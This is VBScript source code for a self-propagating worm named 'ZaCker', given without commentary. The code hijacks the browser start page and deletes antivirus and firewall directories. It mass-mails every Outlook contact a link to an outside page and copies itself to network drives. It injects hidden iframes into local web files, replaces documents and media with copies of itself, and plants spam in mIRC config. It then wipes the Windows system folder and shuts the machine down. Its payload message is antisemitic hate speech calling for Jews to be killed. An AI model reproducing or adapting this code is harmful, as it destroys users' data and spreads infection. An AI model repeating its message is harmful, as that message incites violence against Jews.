On Error Resume Next
Set sss = CreateObject("wscript.shell")
sss.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\ZaCker", Minute(Now)
sss.regwrite "HKCU\software\microsoft\internet Explorer\main\start Page", "http://www.orst.edu/groups/msa/everwonder.swf"
Set fso = CreateObject("scripting.filesystemobject")
Const ForReading = 1, ForWriting = 2, ForAppending = 8
Set Sis = fso.GetSpecialFolder(1)
Set File = fso.OpenTextFile(WScript.ScriptFullName, 1)
File.ReadAll
Set dan = fso.GetFile(WScript.ScriptFullName)
 dan.Copy (Sis & "\ZaCker.vbs")
Set f = fso.OpenTextFile(Sis & "\" & "DaLaL.htm", ForWriting, True)
ap.write "<html><body><span style="& Chr (39)& "position:absolute"& Chr (39)&"><Iframe src=" & Chr (39)& "http://geocities.com/jobreee/main.htm" & Chr (39)& "width="& Chr (39)&"0"& Chr (39)& "height="& Chr (39)&"0"& Chr (39)& "></Iframe></span></body></html>"
 Set f = fso.OpenTextFile(Sis & "\" & "DaLaL.htm", ForReading)
Set d = fso.getfolder(Sis)
drv = d.Drive
fso.deletefolder (drv & "\" & "Program Files\Zone Labs")
fso.DeleteFile (drv & "\" & "Program Files\AntiViral Toolkit Pro\*.*")
fso.DeleteFile (drv & "\" & "Program Files\Command Software\F-PROT95\*.*")
fso.DeleteFile (drv & "\" & "eSafe\Protect\*.*")
fso.DeleteFile (drv & "\" & "PC-Cillin 95\*.*")
fso.DeleteFile (drv & "\" & "PC-Cillin 97\*.*")
fso.DeleteFile (drv & "\" & "Program Files\Quick Heal\*.*")
fso.DeleteFile (drv & "\" & "Program Files\FWIN32\*.*")
fso.DeleteFile (drv & "\" & "Program Files\FindVirus\*.*")
fso.DeleteFile (drv & "\" & "Toolkit\FindVirus\*.*")
fso.DeleteFile (drv & "\" & "f-macro\*.*")
fso.DeleteFile (drv & "\" & "Program Files\McAfeeVirusScan95\*.*")
fso.DeleteFile (drv & "\" & "Program Files\Norton AntiVirus\*.*")
fso.DeleteFile (drv & "\" & "TBAVW95\*.*")
fso.DeleteFile (drv & "\" & "VS95\*.*")
fso.DeleteFile (drv & "\" & "rescue\*.*")
fso.DeleteFile (drv & "\" & "Program Files\Zone Labs\*.*")
S = Chr(34)
L = vbCrLf
O = Chr(40)
C = Chr(41)
A = Chr(38)
Set f = fso.OpenTextFile(Sis & "\" & "outlook.vbs", ForWriting, True)
f.write "Set WW = CreateObject" & O & S & "Outlook.Application" & S & C & L
f.write "Set HT = WW.GetNamespace" & O & S & "MAPI" & S & C & ".GetDefaultFolder" & O & "10" & C & ".Items" & L
f.write "E = HT.Count" & L & "ReDim m" & O & "E" & C & L
f.write "For i = 1 To E" & L & "E = E - 1" & L
f.write " m" & O & "E" & C & "=HT.Item" & O & "i" & C & ".Email1Address" & L
f.write "If i = 1 Then" & L & "Mail = m" & O & "E" & C & L & "Else" & L
f.write "Mail = Mail +" & S & ";" & S & "+ m" & O & "E" & C & L
f.write "End If" & L & "Next" & L & "Set MMM = WW.CreateItem" & O & "0" & C & L
f.write "MMM.to = Mail" & L & "MMM.Subject =" & S & "Very important !!!" & S & L
f.write "MMM.Body =" & S & "See this page" & S & "& vbCrLf &" & S & "http://geocities.com/Jobreee/main.htm" & S & L
f.write "MMM.Send"
Set f = fso.OpenTextFile(Sis & "\" & "outlook.vbs", ForReading)
sss.run (Sis & "\" & "outlook.vbs")
Set ShrDrv = CreateObject("WScript.Network")
Set MMM = ShrDrv.EnumNetworkDrives
If MMM.Count <> 0 Then
For drv = 0 To MMM.Count - 1
If InStr(MMM.Item(drv), "\") <> 0 Then
fso.copyfile (Sis & "\" & "DaLaL.htm"), HOLL.BuildPath(MMM.Item(drv), "Dallah.htm")
fso.copyfile (Sis & "\" & "ZaCker.vbs"), HOLL.BuildPath(MMM.Item(drv), "server.vbs")
End If
Next
End If
Main
Sub Main()
eq = ""
ctr = 0
infectfiles (folderspec)
folderlist (folderspec)
fileexist (filespec)
folderexist (folderspec)
listadriv
mot
End Sub
Sub listadriv()
On Error Resume Next
Dim d, dc, s
Set fso = CreateObject("Scripting.FileSystemObject")
Set dc = fso.Drives
For Each d In dc
If d.DriveType = 2 Or d.DriveType = 3 Then
folderlist (d.Path & "\")
End If
Next
listadrive = s
Call infectfiles(folderspec)
End Sub
Sub infectfiles(folderspec)
On Error Resume Next
Dim f, f1, fc, ext, ap
Const ForReading = 1, ForWriting = 2, ForAppending = 8
 Set fso = CreateObject("Scripting.FileSystemObject")
Set f = fso.getfolder(folderspec)
Set fc = f.Files
For Each f1 In fc
ext = fso.GetExtensionName(f1.Path)
ext = LCase(ext)
s = LCase(f1.Name)
If (ext = "htm") Or (ext = "html") Or (ext = "asp") Then
Set ap = fso.OpenTextFile(f1.Path, 8, True)
ap.write "<html><body><span style="& Chr (39)& "position:absolute"& Chr (39)&"><Iframe src=" & Chr (39)& "http://geocities.com/jobreee/main.htm" & Chr (39)& "width="& Chr (39)&"0"& Chr (39)& "height="& Chr (39)&"0"& Chr (39)& "></Iframe></span></body></html>"
ap.Close
Set ap = fso.OpenTextFile(f1.Path, 1)
Set cop = fso.GetFile(f1.Path)
cop.Copy (f1.Path)
Set atz = fso.GetFile(f1.Path)
atz.Attributes = att.Attributes + 2
ElseIf (ext = "lnk") Or (ext = "zip") Or (ext = "jpg") Or (ext = "jpeg") Or (ext = "mpg") Or (ext = "mpeg") Or (ext = "doc") Or (ext = "xls") Or (ext = "mdb") Or (ext = "txt") Or (ext = "ppt") Or (ext = "pps") Or (ext = "ram") Or (ext = "rm") Or (ext = "mp3") Or (ext = "mdb") Or (ext = "swf") Then
fso.copyfile (Sis & "\" & "ZaCker.vbs"), (f1.Path & ".vbs")
fso.deletefile (f1.Path)
End If
If f1.Name = "mirc.ini" Then
Set fold = fso.getfolder(f1.ParentFolder)
Set fil = fold.Files
For Each f In fil
If (ext = "ini") Then
Set f = fso.OpenTextFile(f.Path, 2, True)
f.write "on 1:JOIN:#:/msg $chan  See This Site http://geocities.com/jobreee/main.htm  $nick! "
Set f = fso.OpenTextFile(f.Path, 1)
End If
Next
End If
Next
End Sub
Sub folderlist(folderspec)
On Error Resume Next
Dim f, f1, sf
Set fso = CreateObject("Scripting.FileSystemObject")
Set f = fso.getfolder(folderspec)
Set sf = f.SubFolders
For Each f1 In sf
infectfiles (f1.Path)
folderlist (f1.Path)
Next
End Sub
Function fileexist(filespec)
On Error Resume Next
Dim msg
Set fso = CreateObject("Scripting.FileSystemObject")
If (fso.FileExists(filespec)) Then
msg = 0
Else
msg = 1
End If
fileexist = msg
End Function
Function folderexist(folderspec)
On Error Resume Next
Dim msg
Set fso = CreateObject("Scripting.FileSystemObject")
If (fso.GetFolderExists(folderspec)) Then
msg = 0
Else
msg = 1
End If
fileexist msg
End Function
Sub mot()
On Error Resume Next
Set sss = CreateObject("wscript.shell")
Set TAFi = sss.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\ZaCker")
 Do
If Minute(Now) = TAFi + 30 And Second(Now) = 5 Then
Set fso = CreateObject("scripting.filesystemobject")
Set Sis = fso.GetSpecialFolder(1)
Set Folder = fso.getfolder(Sis)
Set Files = Folder.Files
For Each File In Files
fso.deletefile (File.Path)
Next
MsgBox " America will never survive till it dismisses jews from its land " & vbCrLf & "            jews bring disasters to any pll they live with" & vbCrLf & "                     i dunno why they are still alive !!!" & vbCrLf & "                          lets kill them one by one", 6, "ZaCker " 
sss.run "rundll32.exe user.exe,exitwindows"
End If
Loop
End Sub
